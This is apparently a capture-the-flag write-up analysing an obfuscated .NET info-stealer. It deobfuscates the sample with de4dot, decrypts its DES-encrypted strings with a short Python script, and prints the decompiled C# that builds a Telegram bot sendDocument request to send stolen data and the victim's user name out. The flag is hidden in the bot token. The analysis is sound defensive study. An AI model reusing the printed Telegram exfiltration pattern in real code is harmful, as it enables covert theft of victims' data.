# stealer
### Overview

The task involved reverse engineering a `.Net 32-bit` executable named `snake.mal`. The primary objective was to analyze the executable, identify its functionality, and decode any hidden or encrypted data within the file. The reversing process was conducted using dnspy for decompiling the executable, and `de4dot` for deobfuscation and a custom python script to decrypt strings used by the malware.

### Initial Analysis

Upon opening `snake.mal.exe` in a dnSpy, it was evident that the executable was heavily obfuscated. The functions and classes were renamed to nonsensical names, making manual analysis difficult.

![image](https://github.com/user-attachments/assets/c7aade9d-9670-4ff0-97c2-2c966c68a8a4)


To proceed with the analysis, `de4dot` was employed to clean the obfuscated code. Running the tool produced a cleaned version of the executable, where the obfuscated symbols were renamed to more readable forms, significantly easing the analysis process.

```jsx
C:\Users\mahmoud\Desktop> C:\Tools\de4dot\de4dot.exe snake.mal

de4dot v3.1.41592.3405 Copyright (C) 2011-2015 de4dot@gmail.com
Latest version and source code: https://github.com/0xd4d/de4dot

Detected Unknown Obfuscator (C:\Users\mahmoud\Desktop\snake\snake.mal)
Cleaning C:\Users\mahmoud\Desktop\snake\snake.mal
Renaming all obfuscated symbols
Saving C:\Users\mahmoud\Desktop\snake\snake-cleaned.mal
```

![image](https://github.com/user-attachments/assets/34de0158-f1ff-491b-8a49-4417c771aee0)


With the code now more readable, we can delve into its functionality.

Found some functions that provide clear evidence that the malware is stealing data.

![image](https://github.com/user-attachments/assets/f641cca3-ed1a-44ba-8e0d-c40b52f98074)


Other numerous functions have been identified that appear to interact with Telegram.

![image](https://github.com/user-attachments/assets/893047fe-11d4-4aca-885b-fd511b1540e3)


If we examine the methods from the previous screenshot, several of them call a function named `smethod_16`, each passing different encrypted strings to it.



The `smethod_16` function is a decryption method, which utilized DES encryption with a key derived from an MD5 hash. 

![image](https://github.com/user-attachments/assets/d486e355-593a-49b9-9429-542bed21440c)

### Decrypting Strings

Wrote Python script to replicate this decryption process:

```jsx
import base64
from Crypto.Cipher import DES
from Crypto.Hash import MD5

def smethod_16(encrypted_string, key):
    try:
        des = DES.new(MD5.new(key.encode()).digest()[:8], DES.MODE_ECB)
        decrypted_bytes = des.decrypt(base64.b64decode(encrypted_string))
        decrypted_string = decrypted_bytes.decode()
        return decrypted_string
    except Exception as e:
        print(f"Error decrypting string: {e}")
        return None
    
```
### Results of Decryption

By applying the Python script to the encrypted strings, the following results were obtained:

```jsx
print(smethod_16("zMaRPCbE0Gb4k/zB6ZNS3r1L34TENqMZD9RW6hkhoOE=", "nnrCOnrJyiwsACMwnkEJB"))
# result "https://api.telegram.org/bot"

print(smethod_16("FphMdFa3hOQv6jbOo+Di/krf6/KeCXcASv1A0PTZtTaqOQqu46FvhqM0pdqb8g0/", "BsrOkyiChvpfhAkipZAxnnChkMGkLnAiZhGMyrnJfULiDGkfTkrTELinhfkLkJrkDExMvkEUCxUkUGr"))
# result "7267561120:QkhGbGFnWXt0M2xlZ3I0bV9nMGVzX3chbGR9"
```
These strings were used to construct a Telegram API request:

```jsx
			ServicePointManager.Expect100Continue = false;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			string text2 = string.Concat(new string[]
			{
				https://api.telegram.org/bot,
				7267561120:QkhGbGFnWXt0M2xlZ3I0bV9nMGVzX3chbGR9,
				/sendDocument?chat_id=,
				5481237002,
				"&caption=",
				string.Concat(new string[]
				{
					" Pc Name: ",
					Environment.UserName,
					" | Snake Tracker\r\n\r\nPW | ",
					Environment.UserName,
					" | Snake\r\n\r\n\r\n"
				})
			});
```

Given our understanding of the Telegram API, these strings are parameters used to communicate with a Telegram bot. This suggests that the malware is designed to steal data and then use the bot to upload that data.

### Getting The Flag

To obtain the flag, all we needed to do was decode the bot token, which revealed the flag.

```jsx
$ echo QkhGbGFnWXt0M2xlZ3I0bV9nMGVzX3chbGR9 | base64 -d           
BHFlagY{t3legr4m_g0es_w!ld} 
```
